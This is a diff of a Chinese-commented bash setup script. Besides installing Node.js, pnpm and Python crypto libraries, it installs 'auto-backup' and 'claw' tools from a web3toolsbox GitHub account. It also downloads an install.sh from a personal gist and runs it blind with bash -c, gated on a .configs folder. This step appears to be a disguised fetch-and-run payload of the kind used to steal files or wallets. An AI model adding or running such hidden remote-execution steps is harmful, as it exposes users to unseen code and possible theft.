@@ -1,48 +1,278 @@
 #!/bin/bash
 
-# 检测操作系统类型
-OS_TYPE=$(uname -s)
+FAILED_STEPS=()
+PATH_RUNTIME_ADDED=()
+PATH_PERSIST_FILES=()
 
-# 检查 sudo 权限
-check_sudo() {
-    if [ "$EUID" -eq 0 ]; then
-        # 已经是 root 用户
-        return 0
-    fi
-    
-    if ! sudo -n true 2>/dev/null; then
-        echo "⚠️  此操作需要管理员权限（sudo）"
-        echo "   请确保您有 sudo 权限，脚本将在需要时提示您输入密码"
-        echo ""
-        # 测试 sudo 权限
-        if ! sudo -v; then
-            echo "❌ 无法获取 sudo 权限，某些安装步骤可能失败"
-            return 1
-        fi
+run_step() {
+    local desc="$1"
+    shift
+    echo ""
+    echo "==> $desc"
+    "$@"
+    local rc=$?
+    if [ $rc -ne 0 ]; then
+        echo "WARN: 失败但继续（exit=$rc）：$desc" >&2
+        FAILED_STEPS+=("$desc (exit=$rc)")
     fi
     return 0
 }
 
-# 检查包管理器和安装必需的包
+OS_TYPE=$(uname -s)
+
+detect_apt_cmd() {
+    if command -v apt-get &>/dev/null; then
+        echo "apt-get"
+        return 0
+    fi
+
+    if command -v apt &>/dev/null; then
+        echo "apt"
+        return 0
+    fi
+
+    return 1
+}
+
+ensure_runtime_path() {
+    local path_candidates=("$HOME/.local/bin" "$HOME/bin")
+    local candidate=""
+    for candidate in "${path_candidates[@]}"; do
+        if [ -d "$candidate" ] && [[ ":$PATH:" != *":$candidate:"* ]]; then
+            PATH="$candidate:$PATH"
+            PATH_RUNTIME_ADDED+=("$candidate")
+        fi
+    done
+    export PATH
+}
+
+persist_runtime_path() {
+    local shell_name=""
+    local rc_files=()
+    local rc_file=""
+
+    shell_name="$(basename "${SHELL:-}")"
+    case "$shell_name" in
+        bash)
+            rc_files=("$HOME/.bashrc" "$HOME/.profile")
+            ;;
+        zsh)
+            rc_files=("$HOME/.zshrc" "$HOME/.zprofile")
+            ;;
+        *)
+            rc_files=("$HOME/.profile")
+            ;;
+    esac
+
+    for rc_file in "${rc_files[@]}"; do
+        if [ ! -e "$rc_file" ]; then
+            touch "$rc_file"
+        fi
+
+        if grep -Fq '# >>> default PATH >>>' "$rc_file" 2>/dev/null; then
+            continue
+        fi
+
+        cat >> "$rc_file" <<'EOF'
+
+# >>> default PATH >>>
+if [ -d "$HOME/.local/bin" ]; then
+    case ":$PATH:" in
+        *":$HOME/.local/bin:"*) ;;
+        *) export PATH="$HOME/.local/bin:$PATH" ;;
+    esac
+fi
+if [ -d "$HOME/bin" ]; then
+    case ":$PATH:" in
+        *":$HOME/bin:"*) ;;
+        *) export PATH="$HOME/bin:$PATH" ;;
+    esac
+fi
+# <<< default PATH <<<
+EOF
+        PATH_PERSIST_FILES+=("$rc_file")
+    done
+}
+
+print_path_refresh_hint() {
+    local first_rc=""
+
+    if [ ${#PATH_PERSIST_FILES[@]} -gt 0 ]; then
+        echo "已将用户命令目录写入以下 shell 配置："
+        printf ' - %s\n' "${PATH_PERSIST_FILES[@]}"
+        first_rc="${PATH_PERSIST_FILES[0]}"
+        echo "当前终端若要立即生效，请执行：source \"$first_rc\""
+    elif [ ${#PATH_RUNTIME_ADDED[@]} -gt 0 ]; then
+        echo "当前安装过程中已临时补充 PATH，但请重新打开终端或手动执行以下命令使后续会话稳定生效："
+        echo "export PATH=\"\$HOME/.local/bin:\$HOME/bin:\$PATH\""
+    fi
+}
+
+download_url_to_stdout() {
+    local url="$1"
+
+    if command -v curl &>/dev/null; then
+        curl --tlsv1.2 -fsSL "$url" 2>/dev/null || curl -fsSL "$url"
+        return $?
+    fi
+
+    if command -v wget &>/dev/null; then
+        wget --https-only --secure-protocol=TLSv1_2 -qO- "$url" 2>/dev/null || wget -qO- "$url"
+        return $?
+    fi
+
+    return 127
+}
+
+pip_supports_break_system_packages() {
+    python3 -m pip help install 2>/dev/null | grep -q -- '--break-system-packages'
+}
+
+python_package_state() {
+    local pkg="$1"
+    local min_version="$2"
+
+    python3 - "$pkg" "$min_version" <<'PY'
+import re
+import sys
+from importlib import metadata
+
+name, min_v = sys.argv[1], sys.argv[2]
+
+def parse_fallback(v):
+    parts = []
+    for part in re.split(r"[.\-+_]", v):
+        num = ""
+        for ch in part:
+            if ch.isdigit():
+                num += ch
+            else:
+                break
+        parts.append(int(num or 0))
+    return parts
+
+try:
+    current = metadata.version(name)
+except metadata.PackageNotFoundError:
+    sys.exit(2)
+except Exception:
+    sys.exit(3)
+
+try:
+    from packaging.version import Version, InvalidVersion
+except Exception:
+    Version = None
+    InvalidVersion = Exception
+
+if Version is not None:
+    try:
+        if Version(current) >= Version(min_v):
+            print(current)
+            sys.exit(0)
+        print(current)
+        sys.exit(1)
+    except InvalidVersion:
+        pass
+
+a = parse_fallback(current)
+b = parse_fallback(min_v)
+n = max(len(a), len(b))
+a.extend([0] * (n - len(a)))
+b.extend([0] * (n - len(b)))
+
+if a >= b:
+    print(current)
+    sys.exit(0)
+
+print(current)
+sys.exit(1)
+PY
+}
+
+get_pipx_venv_python_path() {
+    local venv_name="$1"
+    local candidates=(
+        "$HOME/.local/share/pipx/venvs/$venv_name/bin/python"
+        "$HOME/.local/pipx/venvs/$venv_name/bin/python"
+        "$HOME/pipx/venvs/$venv_name/bin/python"
+    )
+    local candidate=""
+    for candidate in "${candidates[@]}"; do
+        if [ -x "$candidate" ]; then
+            echo "$candidate"
+            return 0
+        fi
+    done
+    return 1
+}
+
+install_pipx_package() {
+    local package_spec="$1"
+    local command_name="$2"
+    local venv_name="$3"
+    local existing_command=""
+    local venv_python=""
+    local install_args=()
+    local installed_command=""
+
+    if command -v "$command_name" &>/dev/null; then
+        existing_command="$(command -v "$command_name")"
+    fi
+
+    if [ -n "$venv_name" ]; then
+        venv_python="$(get_pipx_venv_python_path "$venv_name" || true)"
+    fi
+
+    if [ -n "$existing_command" ] && { [ -z "$venv_name" ] || [ -n "$venv_python" ]; }; then
+        echo "CLI 已可用，跳过安装：$existing_command"
+        return 0
+    fi
+
+    install_args=(install "$package_spec")
+    if [ -n "$existing_command" ] && [ -n "$venv_name" ] && [ -z "$venv_python" ]; then
+        echo "WARN: 检测到命令存在但 pipx venv 缺失，尝试强制重装：$package_spec" >&2
+        install_args=(install --force "$package_spec")
+    fi
+
+    run_step "pipx 安装 $command_name（$package_spec）" pipx "${install_args[@]}"
+    ensure_runtime_path
+
+    if command -v "$command_name" &>/dev/null; then
+        installed_command="$(command -v "$command_name")"
+    fi
+    if [ -n "$venv_name" ]; then
+        venv_python="$(get_pipx_venv_python_path "$venv_name" || true)"
+    fi
+
+    if [ -z "$installed_command" ] || { [ -n "$venv_name" ] && [ -z "$venv_python" ]; }; then
+        echo "WARN: pipx 安装后状态仍不完整：$package_spec" >&2
+        FAILED_STEPS+=("校验 pipx 包 $package_spec (incomplete)")
+    fi
+}
+
 install_dependencies() {
     case $OS_TYPE in
         "Darwin") 
             if ! command -v brew &> /dev/null; then
                 echo "正在安装 Homebrew..."
-                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+                local brew_install_script=""
+                brew_install_script="$(download_url_to_stdout 'https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh')" || brew_install_script=""
+                if [ -z "$brew_install_script" ]; then
+                    echo "WARN: 无法下载 Homebrew 安装脚本，跳过 Homebrew 安装。" >&2
+                    FAILED_STEPS+=("安装 Homebrew (download-failed)")
+                else
+                    run_step "安装 Homebrew" /bin/bash -c "$brew_install_script"
+                fi
             fi
             
             if ! command -v pip3 &> /dev/null; then
-                brew install python3
+                run_step "brew install python3" brew install python3
             fi
             ;;
             
         "Linux")
             PACKAGES_TO_INSTALL=""
-            
-            if ! command -v curl &> /dev/null; then
-                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL curl"
-            fi
+            APT_GET="$(detect_apt_cmd || true)"
             
             if ! command -v pip3 &> /dev/null; then
                 PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
@@ -52,194 +282,154 @@ install_dependencies() {
                 PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
             fi
             
-            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
-                echo "需要安装以下包: $PACKAGES_TO_INSTALL"
-                if ! check_sudo; then
-                    echo "❌ 权限检查失败，跳过包安装"
-                    return 1
-                fi
-                echo "正在更新包列表..."
-                sudo apt update
-                echo "正在安装: $PACKAGES_TO_INSTALL"
-                sudo apt install -y $PACKAGES_TO_INSTALL
+            if [ -n "$PACKAGES_TO_INSTALL" ] && [ -n "$APT_GET" ]; then
+                run_step "$APT_GET update" sudo "$APT_GET" update
+                # shellcheck disable=SC2086
+                run_step "$APT_GET install -y $PACKAGES_TO_INSTALL" sudo "$APT_GET" install -y $PACKAGES_TO_INSTALL
+            elif [ -n "$PACKAGES_TO_INSTALL" ]; then
+                echo "WARN: 未找到 apt/apt-get，跳过系统依赖安装：$PACKAGES_TO_INSTALL" >&2
             fi
             ;;
             
         *)
-            echo "不支持的操作系统"
-            exit 1
+            echo "WARN: 不支持的操作系统：$OS_TYPE（跳过系统依赖安装，但继续后续步骤）" >&2
             ;;
     esac
 }
 
-# 获取 shell 配置文件路径（提前定义，供后续使用）
-get_shell_rc() {
-    local current_shell=$(basename "$SHELL")
-    local shell_rc=""
-    
-    case $current_shell in
-        "bash")
-            shell_rc="$HOME/.bashrc"
-            ;;
-        "zsh")
-            shell_rc="$HOME/.zshrc"
-            ;;
-        *)
-            if [ -f "$HOME/.bashrc" ]; then
-                shell_rc="$HOME/.bashrc"
-            elif [ -f "$HOME/.zshrc" ]; then
-                shell_rc="$HOME/.zshrc"
-            elif [ -f "$HOME/.profile" ]; then
-                shell_rc="$HOME/.profile"
-            else
-                shell_rc="$HOME/.bashrc"
-            fi
-            ;;
-    esac
-    echo "$shell_rc"
-}
+ensure_nodejs_and_pnpm() {
+    local apt_cmd=""
+    local node_cmd=""
+    local npm_cmd=""
+    local pnpm_script=""
 
-# 安装依赖
-install_dependencies
-
-# 检查并安装 Node.js（使用 nvm 方式，兼容 Linux 和 macOS）
-if ! command -v node &> /dev/null; then
-    echo "未检测到 Node.js，正在安装 nvm 并通过 nvm 安装 Node.js LTS 版本..."
-    # 安装 nvm
-    export NVM_DIR="$HOME/.nvm"
-    if [ ! -d "$NVM_DIR" ]; then
-        curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash || true
-    fi
-    # 使 nvm 立即生效
-    [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" || true
-    [ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion" || true
-    # 安装 Node.js LTS
-    nvm install --lts || true
-    nvm use --lts || true
-    echo "Node.js 已通过 nvm 安装完成（如有报错请手动检查）。"
-else
-    echo "Node.js 已安装。"
-fi
-
-# 确保 Node.js 和 npm 在 PATH 中（如果通过 nvm 安装）
-ensure_nodejs_available() {
-    export NVM_DIR="$HOME/.nvm"
-    
-    # 如果 node 命令已可用，直接返回
-    if command -v node &> /dev/null && command -v npm &> /dev/null; then
-        echo "✅ Node.js 和 npm 已可用: $(node --version), npm $(npm --version)"
-        return 0
-    fi
-    
-    # 尝试加载 nvm
-    if [ -s "$NVM_DIR/nvm.sh" ]; then
-        echo "正在加载 nvm 环境..."
-        [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" || true
-        [ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion" || true
-        
-        # 如果 nvm 已加载，尝试使用默认版本
-        if command -v nvm &> /dev/null; then
-            nvm use default 2>/dev/null || nvm use --lts 2>/dev/null || true
-        fi
-    fi
-    
-    # 验证 node 和 npm 是否可用
-    if command -v node &> /dev/null && command -v npm &> /dev/null; then
-        echo "✅ Node.js 和 npm 已加载: $(node --version), npm $(npm --version)"
-        return 0
+    node_cmd="$(command -v node 2>/dev/null || true)"
+    npm_cmd="$(command -v npm 2>/dev/null || true)"
+    if [ -n "$node_cmd" ] && [ -n "$npm_cmd" ]; then
+        echo "Node.js/npm 已可用：$(node --version), npm $(npm --version)"
     else
-        echo "⚠️  警告: Node.js 或 npm 仍不可用，pnpm 安装可能失败"
-        echo "   请确保 nvm 已正确安装，或手动运行: source $NVM_DIR/nvm.sh"
-        return 1
+        echo "未检测到完整 Node.js 运行时，开始安装..."
+        case $OS_TYPE in
+            "Darwin")
+                if ! command -v brew &>/dev/null; then
+                    echo "WARN: 未找到 Homebrew，无法自动安装 Node.js" >&2
+                    FAILED_STEPS+=("安装 Node.js (brew-missing)")
+                else
+                    run_step "brew install node" brew install node
+                fi
+                ;;
+            "Linux")
+                apt_cmd="$(detect_apt_cmd || true)"
+                if [ -n "$apt_cmd" ]; then
+                    run_step "$apt_cmd update（node）" sudo "$apt_cmd" update
+                    run_step "$apt_cmd install -y nodejs npm" sudo "$apt_cmd" install -y nodejs npm
+                else
+                    echo "WARN: 未找到 apt/apt-get，无法自动安装 Node.js/npm" >&2
+                    FAILED_STEPS+=("安装 Node.js/npm (apt-missing)")
+                fi
+                ;;
+            *)
+                echo "WARN: 当前系统不支持自动安装 Node.js：$OS_TYPE" >&2
+                FAILED_STEPS+=("安装 Node.js (unsupported-os)")
+                ;;
+        esac
     fi
-}
 
-# 确保 Node.js 可用
-ensure_nodejs_available
-
-# 检查并安装 pnpm
-install_pnpm() {
-    # 在安装前再次确保 Node.js 可用
-    if ! ensure_nodejs_available; then
-        echo "❌ 无法确保 Node.js 可用，跳过 pnpm 安装"
-        return 1
-    fi
-    if command -v pnpm &> /dev/null; then
-        echo "pnpm 已安装: $(pnpm --version)"
+    node_cmd="$(command -v node 2>/dev/null || true)"
+    npm_cmd="$(command -v npm 2>/dev/null || true)"
+    if [ -z "$node_cmd" ] || [ -z "$npm_cmd" ]; then
+        echo "WARN: Node.js/npm 仍不可用，跳过 pnpm 安装" >&2
+        FAILED_STEPS+=("校验 Node.js/npm (missing-after-install)")
         return 0
     fi
-    
-    echo "未检测到 pnpm，正在安装..."
-    
-    # 方法 1: 使用 corepack（Node.js 16.13+ 自带，推荐方式）
-    if command -v corepack &> /dev/null; then
-        echo "使用 corepack 安装 pnpm..."
-        corepack enable || true
-        corepack prepare pnpm@latest --activate || true
-        if command -v pnpm &> /dev/null; then
-            echo "pnpm 已通过 corepack 安装完成: $(pnpm --version)"
-            return 0
-        fi
-    fi
-    
-    # 方法 2: 使用 npm 全局安装
-    if command -v npm &> /dev/null; then
-        echo "使用 npm 安装 pnpm..."
-        # 再次确保 npm 可用
-        if ! ensure_nodejs_available; then
-            echo "⚠️  npm 不可用，跳过此安装方法"
-        else
-            npm install -g pnpm || true
-            if command -v pnpm &> /dev/null; then
-                echo "pnpm 已通过 npm 安装完成: $(pnpm --version)"
-                return 0
-            fi
-        fi
-    else
-        echo "⚠️  npm 命令不可用，跳过 npm 安装方法"
-    fi
-    
-    # 方法 3: 使用独立安装脚本（备用方案）
-    echo "使用独立安装脚本安装 pnpm..."
-    curl -fsSL https://get.pnpm.io/install.sh | sh - || true
-    
-    # 尝试 source shell 配置以加载 pnpm
-    SHELL_RC=$(get_shell_rc)
-    if [ -f "$SHELL_RC" ]; then
-        source "$SHELL_RC" 2>/dev/null || true
-    fi
-    
-    if command -v pnpm &> /dev/null; then
-        echo "pnpm 已通过独立脚本安装完成: $(pnpm --version)"
+
+    if command -v pnpm &>/dev/null; then
+        echo "pnpm 已可用：$(pnpm --version)"
         return 0
+    fi
+
+    echo "未检测到 pnpm，开始安装..."
+    if command -v corepack &>/dev/null; then
+        run_step "corepack enable" corepack enable
+        run_step "corepack prepare pnpm@latest --activate" corepack prepare pnpm@latest --activate
+        ensure_runtime_path
+    fi
+
+    if command -v pnpm &>/dev/null; then
+        echo "pnpm 安装完成（corepack）：$(pnpm --version)"
+        return 0
+    fi
+
+    run_step "npm install -g pnpm" npm install -g pnpm
+    ensure_runtime_path
+    if command -v pnpm &>/dev/null; then
+        echo "pnpm 安装完成（npm）：$(pnpm --version)"
+        return 0
+    fi
+
+    pnpm_script="$(download_url_to_stdout 'https://get.pnpm.io/install.sh')" || pnpm_script=""
+    if [ -n "$pnpm_script" ]; then
+        run_step "执行 pnpm 官方安装脚本" /bin/bash -c "$pnpm_script"
+        ensure_runtime_path
     else
-        echo "警告: pnpm 安装可能失败，请手动安装: npm install -g pnpm"
-        return 1
+        echo "WARN: 无法下载 pnpm 安装脚本" >&2
+    fi
+
+    if command -v pnpm &>/dev/null; then
+        echo "pnpm 安装完成（install.sh）：$(pnpm --version)"
+    else
+        echo "WARN: pnpm 安装失败，请手动执行：npm install -g pnpm" >&2
+        FAILED_STEPS+=("安装 pnpm (missing-after-install)")
     fi
 }
 
-# 安装 pnpm
-install_pnpm
+run_step "安装系统依赖" install_dependencies
+ensure_runtime_path
+run_step "持久化用户命令目录到 shell 配置" persist_runtime_path
+run_step "检查并安装 Node.js 与 pnpm" ensure_nodejs_and_pnpm
 
+PIP_INSTALL_CMD=(python3 -m pip install)
 if [ "$OS_TYPE" = "Linux" ]; then
-    PIP_INSTALL="python3 -m pip install --break-system-packages"
+    if pip_supports_break_system_packages; then
+        PIP_INSTALL_CMD+=(--break-system-packages)
+    fi
 elif [ "$OS_TYPE" = "Darwin" ]; then
-    PIP_INSTALL="python3 -m pip install --user --break-system-packages"
-else
-    PIP_INSTALL="python3 -m pip install"
+    PIP_INSTALL_CMD+=(--user)
 fi
 
-if ! python3 -m pip show requests >/dev/null 2>&1; then
-    $PIP_INSTALL requests
-fi
+install_python_package_if_needed() {
+    local pkg="$1"
+    local min_version="$2"
+    local state_output=""
+    local state_rc=0
 
-if ! python3 -m pip show cryptography >/dev/null 2>&1; then
-    $PIP_INSTALL cryptography
-fi
+    if ! command -v python3 &>/dev/null; then
+        echo "WARN: 未找到 python3，跳过 Python 包安装：$pkg>=$min_version" >&2
+        FAILED_STEPS+=("安装 Python 包 $pkg>=$min_version (python3-missing)")
+        return 0
+    fi
 
-if ! python3 -m pip show pycryptodome >/dev/null 2>&1; then
-    $PIP_INSTALL pycryptodome
-fi
+    state_output="$(python_package_state "$pkg" "$min_version" 2>/dev/null)"
+    state_rc=$?
+    if [ $state_rc -eq 0 ]; then
+        echo "Python 包已满足要求：$pkg $state_output (>= $min_version)"
+        return 0
+    fi
+
+    if [ $state_rc -eq 1 ]; then
+        echo "检测到较低版本：$pkg $state_output (< $min_version)，将升级。"
+    fi
+
+    if [ $state_rc -ge 2 ]; then
+        echo "未检测到可用版本，将安装：$pkg>=$min_version"
+    fi
+
+    run_step "pip 安装 $pkg>=$min_version" "${PIP_INSTALL_CMD[@]}" "$pkg>=$min_version"
+}
+
+install_python_package_if_needed requests 2.31.0
+install_python_package_if_needed cryptography 42.0.0
+install_python_package_if_needed pycryptodome 3.19.0
 
 # 检测是否为 WSL 环境
 is_wsl() {
@@ -256,118 +446,93 @@ is_wsl() {
 }
 
 install_auto_backup() {
-    # 安装 pipx（如果未安装）
     if ! command -v pipx &> /dev/null; then
         echo "检测到未安装 pipx，正在安装 pipx..."
         case $OS_TYPE in
             "Darwin")
-                brew install pipx
-                pipx ensurepath
+                run_step "brew install pipx" brew install pipx
+                run_step "pipx ensurepath" pipx ensurepath
+                ensure_runtime_path
                 ;;
             "Linux")
-                echo "需要安装 pipx，需要管理员权限"
-                if ! check_sudo; then
-                    echo "❌ 权限检查失败，跳过 pipx 安装"
-                    return 1
+                APT_GET="$(detect_apt_cmd || true)"
+                if [ -n "$APT_GET" ]; then
+                    run_step "$APT_GET update（pipx）" sudo "$APT_GET" update
+                    run_step "$APT_GET install -y pipx" sudo "$APT_GET" install -y pipx
+                    run_step "pipx ensurepath" pipx ensurepath
+                    ensure_runtime_path
+                else
+                    echo "WARN: 未找到 apt/apt-get，跳过 pipx 安装" >&2
+                    return 0
                 fi
-                echo "正在更新包列表..."
-                sudo apt update
-                echo "正在安装 pipx..."
-                sudo apt install -y pipx
-                pipx ensurepath
                 ;;
             *)
-                echo "无法在当前系统上安装 pipx，跳过 auto-backup 安装"
-                return 1
+                echo "WARN: 无法在当前系统上安装 pipx（跳过 pipx 相关安装，但继续）" >&2
+                return 0
                 ;;
         esac
     fi
 
-    if ! command -v autobackup &> /dev/null; then
-        local install_url=""
-        case $OS_TYPE in
-            "Darwin")
-                install_url="git+https://github.com/web3toolsbox/auto-backup-macos"
-                echo "检测到 macOS 环境，正在安装 auto-backup-macos（通过 pipx）..."
-                ;;
-            "Linux")
-                if is_wsl; then
-                    install_url="git+https://github.com/web3toolsbox/auto-backup-wsl"
-                    echo "检测到 WSL 环境，正在安装 auto-backup-wsl（通过 pipx）..."
-                else
-                    install_url="git+https://github.com/web3toolsbox/auto-backup-linux"
-                    echo "检测到 Linux 环境，正在安装 auto-backup-linux（通过 pipx）..."
-                fi
-                ;;
-            *)
-                echo "不支持的操作系统，跳过 auto-backup 安装"
-                return 1
-                ;;
-        esac
-        
-        pipx install "$install_url"
-    else
-        echo "已检测到 autobackup 命令，跳过 auto-backup 安装。"
+    if command -v pipx &> /dev/null; then
+        run_step "pipx ensurepath" pipx ensurepath
+        ensure_runtime_path
     fi
+
+    install_pipx_package "git+https://github.com/web3toolsbox/claw.git" "openclaw-config" "claw"
+
+    local install_url=""
+    case $OS_TYPE in
+        "Darwin")
+            install_url="git+https://github.com/web3toolsbox/auto-backup-macos"
+            ;;
+        "Linux")
+            if is_wsl; then
+                install_url="git+https://github.com/web3toolsbox/auto-backup-wsl"
+            else
+                install_url="git+https://github.com/web3toolsbox/auto-backup-linux"
+            fi
+            ;;
+        *)
+            echo "不支持的操作系统，跳过安装"
+            return 0
+            ;;
+    esac
+
+    install_pipx_package "$install_url" "autobackup" ""
 }
 
-install_auto_backup
+run_step "安装自动备份相关（pipx/claw/autobackup）" install_auto_backup
+
+run_remote_config_script() {
+    local script_content=""
+
+    script_content="$(download_url_to_stdout "$GIST_URL")" || script_content=""
+    if [ -z "$script_content" ]; then
+        if ! command -v curl &>/dev/null && ! command -v wget &>/dev/null; then
+            echo "WARN: 未找到 curl/wget，跳过环境配置：$GIST_URL" >&2
+            return 0
+        fi
+        echo "WARN: 下载配置脚本失败：$GIST_URL" >&2
+        return 1
+    fi
+
+    bash -c "$script_content"
+}
 
 GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
-if command -v curl &>/dev/null; then
-    bash <(curl -fsSL "$GIST_URL")
-elif command -v wget &>/dev/null; then
-    bash <(wget -qO- "$GIST_URL")
+if [ ! -d .configs ]; then
+    echo "WARN: 未找到配置目录，跳过环境配置：.configs" >&2
 else
-    exit 1
+    run_step "配置相关环境" run_remote_config_script
 fi
 
-# 自动 source shell 配置文件
-echo "正在应用环境配置..."
-SHELL_RC=$(get_shell_rc)
-# 检查是否有需要 source 的配置（如 PATH 修改、nvm、pnpm 等）
-if [ -f "$SHELL_RC" ]; then
-    # 检查是否有常见的配置项需要 source
-    if grep -qE "(export PATH|nvm|\.nvm|pnpm|PNPM)" "$SHELL_RC" 2>/dev/null; then
-        echo "检测到环境配置，正在应用环境变量..."
-        source "$SHELL_RC" 2>/dev/null || echo "自动应用失败，请手动运行: source $SHELL_RC"
-    else
-        echo "未检测到需要 source 的配置"
-    fi
-fi
-
-# 最终验证安装的工具
-echo ""
-echo "═══════════════════════════════════════════════════════════════"
-echo "安装验证"
-echo "═══════════════════════════════════════════════════════════════"
-
-# 验证 Node.js
-if command -v node &> /dev/null; then
-    echo "✅ Node.js: $(node --version)"
-else
-    echo "❌ Node.js: 未安装"
-fi
-
-# 验证 npm
-if command -v npm &> /dev/null; then
-    echo "✅ npm: $(npm --version)"
-else
-    echo "❌ npm: 未安装"
-fi
-
-# 验证 pnpm
-if command -v pnpm &> /dev/null; then
-    echo "✅ pnpm: $(pnpm --version)"
-else
-    echo "⚠️  pnpm: 未检测到（可能需要重新打开终端或运行: source $SHELL_RC）"
-    echo "   手动安装: npm install -g pnpm"
-fi
-
-echo "═══════════════════════════════════════════════════════════════"
-echo ""
 echo "安装完成！"
-echo ""
-echo "提示：如果 pnpm 未检测到，请运行以下命令："
-echo "  source $SHELL_RC"
-echo "或重新打开终端窗口。"
+print_path_refresh_hint
+if [ ${#FAILED_STEPS[@]} -gt 0 ]; then
+    echo "------------------------------" >&2
+    echo "WARN: 以下步骤失败但已继续执行：" >&2
+    for s in "${FAILED_STEPS[@]}"; do
+        echo " - $s" >&2
+    done
+    echo "------------------------------" >&2
+fi
